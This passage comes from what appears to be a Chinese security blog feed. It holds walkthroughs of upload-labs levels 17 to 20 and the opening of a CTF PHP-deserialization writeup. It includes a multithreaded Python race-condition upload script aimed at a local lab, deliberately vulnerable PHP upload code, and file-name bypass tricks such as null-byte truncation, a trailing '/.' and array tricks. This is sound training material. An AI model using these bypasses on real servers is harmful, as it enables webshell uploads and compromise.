class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Referer: http://127.0.0.1/Pass-17/index.php</span></span><br><span class="line"><span class="string">Cookie: pass=17</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------6696274297634</span></span><br><span class="line"><span class="string">Content-Length: 341</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------6696274297634</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;</span>upload_file<span class="string">&quot;; filename=&quot;</span><span class="number">17.</span>php<span class="string">&quot;</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php phpinfo();?&gt;</span></span><br><span class="line"><span class="string">-----------------------------6696274297634</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;</span>submit<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">上传</span></span><br><span class="line"><span class="string">-----------------------------6696274297634--</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    code, head, html, redirect, log = hh.http(<span class="string">&#x27;http://127.0.0.1/Pass-17/index.php&#x27;</span>, raw=raw)</span><br><span class="line">    <span class="keyword">print</span>(str(code) + <span class="string">&quot;\r&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">200</span>)</span><br><span class="line">pool.map(upload, range(<span class="number">100000</span>))</span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103205230451.png" alt="image-20201103205230451"></p><h2 id="Pass-18-条件竞争"><a href="#Pass-18-条件竞争" class="headerlink" title="Pass-18 条件竞争"></a>Pass-18 条件竞争</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    $imgFileName =time();</span><br><span class="line">    $u = <span class="keyword">new</span> MyUpload($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],$imgFileName);</span><br><span class="line">    $status_code = $u-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> ($status_code) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-5</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-6</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> $cls_arr_ext_accepted = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> $dir </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;setDir( $dir );</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103205839989.png" alt="image-20201103205839989"></p><p><code>move</code>文件在<code>rename</code>前面，利用条件竞争，上传图片马</p><h3 id="2-利用-15"><a href="#2-利用-15" class="headerlink" title="2. 利用"></a>2. 利用</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103211045508.png" alt="image-20201103211045508"></p><p>无限重放，我这没跑出来😂</p><h2 id="Pass-19-or-0x00绕过"><a href="#Pass-19-or-0x00绕过" class="headerlink" title="Pass-19 /. or 0x00绕过"></a>Pass-19 /. or 0x00绕过</h2><h3 id="1-分析-12"><a href="#1-分析-12" class="headerlink" title="1. 分析"></a>1. 分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103211406134.png" alt="image-20201103211406134"></p><p>通过代码，发现<code>move_uploaded_file()</code>函数中的<code>img_path</code>是由post参数<code>save_name</code>控制的，因此可以在save_name利用00截断绕过。</p><p>当然，因为<code>move_uploaded_file</code>会忽略掉文件末尾的<code>/.</code>, 所以我们也可以用<code>/.</code>绕过</p><h3 id="2-利用-16"><a href="#2-利用-16" class="headerlink" title="2. 利用"></a>2. 利用</h3><p><code>/.</code>绕过</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103211835095.png" alt="image-20201103211835095"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103211918067.png" alt="image-20201103211918067"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103211938414.png" alt="image-20201103211938414"></p><h2 id="Pass-20-数组-绕过"><a href="#Pass-20-数组-绕过" class="headerlink" title="Pass-20 数组+/.绕过"></a>Pass-20 数组+/.绕过</h2><h3 id="1-代码分析-2"><a href="#1-代码分析-2" class="headerlink" title="1. 代码分析"></a>1. 代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    $allow_type = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],$allow_type))&#123;</span><br><span class="line">        $msg = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        $file = <span class="keyword">empty</span>($_POST[<span class="string">&#x27;save_name&#x27;</span>]) ? $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(<span class="string">&#x27;.&#x27;</span>, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $file_name = reset($file) . <span class="string">&#x27;.&#x27;</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $msg = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第5行先检查MIME类型，然后判断save_name参数是否为空，为空就把文件本来名称赋值给<code>$file</code>,否则就是将<code>save_name</code>参数的值赋给它。紧接着判断<code>$file</code>是否是数组，如果不是数组则将其拆成数组，这里<code>explode</code> 根据<code>.</code>分割，返回值为数组</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103222435710.png" alt="image-20201103222435710"></p><blockquote><p>explode() 函数把字符串打散为数组</p><p>语法：explode(separator,string,limit)</p></blockquote><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>separator</em></td><td align="left">必需。规定在哪里分割字符串。</td></tr><tr><td align="left"><em>string</em></td><td align="left">必需。要分割的字符串。</td></tr><tr><td align="left"><em>limit</em></td><td align="left">可选。规定所返回的数组元素的数目。可能的值：<br />大于 0 - 返回包含最多 <em>limit</em> 个元素的数组<br />小于 0 - 返回包含除了最后的 -<em>limit</em> 个元素以外的所有元素的数组<br />0 - 返回包含一个元素的数组</td></tr><tr><td align="left">返回值：</td><td align="left">返回字符串的数组</td></tr></tbody></table><p>数组最后一个的值(<code>end</code>函数就是取数组最后一个的值)同白名单做比较，符合jpg、png、gif中的一种就允许上传了</p><p>​    在允许上传之后还要把数组的值拼接在一起对文件进行重命名。所以我们可以构造:</p><ul><li><code>save_name[0]=tao.php/</code></li><li><code>save_name[1]置为空</code></li><li><code>save_name[2]=jpg</code>(白名单后缀校验)</li></ul><blockquote><p><code>reset()</code> 函数将内部指针指向数组中的第一个元素，并输出</p></blockquote><p><code>reset($file)</code>取的是数组的第一个元素即<code>tao.php/</code>，然后接了一个’.’符号，之后又将数组最后一个元素内容拼接到一起</p><p>Q：可能有的人会疑问数组最后一个值不是jpg吗？</p><p>A：其实当我们只设置了两个数组元素的时候，数组的元素个数就只有两个了。原因如下图：</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103223547471.png" alt="image-20201103223547471"></p><p>之后第20对<code>$file_name</code>进行的拼接，因为<code>$save_name[2-1] = $save_name[1] =空</code>, 所以最后<code>$file_name</code>的值为<code>tao.php/.</code></p><p>那么最后利用原理就跟<code>Pass19</code>一样了，对于像<code>tao.php/.</code>这样的文件路径，<code>move_uploaded_file()</code>函数会忽略掉文件末尾的<code>/.</code>。如此一来上传的就是php文件后缀了</p><h3 id="2-利用-17"><a href="#2-利用-17" class="headerlink" title="2. 利用"></a>2. 利用</h3><p>burp抓包上传</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103224558867.png" alt="image-20201103224558867"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103224634474.png" alt="image-20201103224634474"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103224652060.png" alt="image-20201103224652060"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;upload-labs&quot;&gt;&lt;a href=&quot;#upload-labs&quot; class=&quot;headerlink&quot; title=&quot;upload-labs&quot;&gt;&lt;/a&gt;upload-labs&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;说明：做题前先清空之前关卡上传的文件&lt;/p</summary>
      
    
    
    
    <category term="PHP" scheme="http://www.ywboy.cn/categories/PHP/"/>
    
    <category term="web安全" scheme="http://www.ywboy.cn/categories/PHP/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="php安全" scheme="http://www.ywboy.cn/tags/php%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-Web_php_unserialize Writeup</title>
    <link href="http://www.ywboy.cn/2020/10/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web-php-unserialize-Writeup/"/>
    <id>http://www.ywboy.cn/2020/10/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web-php-unserialize-Writeup/</id>
    <published>2020-10-22T02:51:00.000Z</published>
    <updated>2020-10-22T03:05:40.035Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码是从17行开始执行的：</p><ol><li><p>首先判断是否存在<strong>GET</strong>参数<code>var</code>, 若存在则对其进行<code>Base64</code>解码后存入<code>$var</code>变量，若不存在，执行25行的代码，高亮输出当前页面的源码</p></li><li><p>解码后对<code>$var</code>进行一个正则的匹配，匹配到的话直接结束（<code>die</code>）并显示 <strong>stop hacking!**，如果没匹配到就</strong>反序列化**</p></li></ol><p>源代码中给出了<code>Demo</code>类，这里我们需要知道这<strong>三个魔术方法</strong>：</p><ul><li><p><code>__construct()</code>：php构造方法，具有构造方法的类会在<font color="red">每次创建新对象前调用此方法 </font>，该方法常用于完成一些初始化工作，</p></li><li><p><code>__destruct()</code>：php析构方法，当<font color="red"> <strong>某个对象的所有引用都被删除</strong> </font>或者 <font color="red"><strong>当对象被显式销毁</strong></font> 时，会执行此方法。</p></li><li><p><code>__wakeup()</code>：PHP反序列化时执行的第一个方法， <code>unserialize()</code>会先检查是否存在 <code>__wakeup()</code> 方法 ， 若存在则会先调用该方法 ， 来预先准备对象需要的资源( 比如重新建立数据库连接 ， 执行其他初始化操作等等 )</p></li></ul><blockquote><p>更多有关PHP魔法方法的内容可以参考：<a 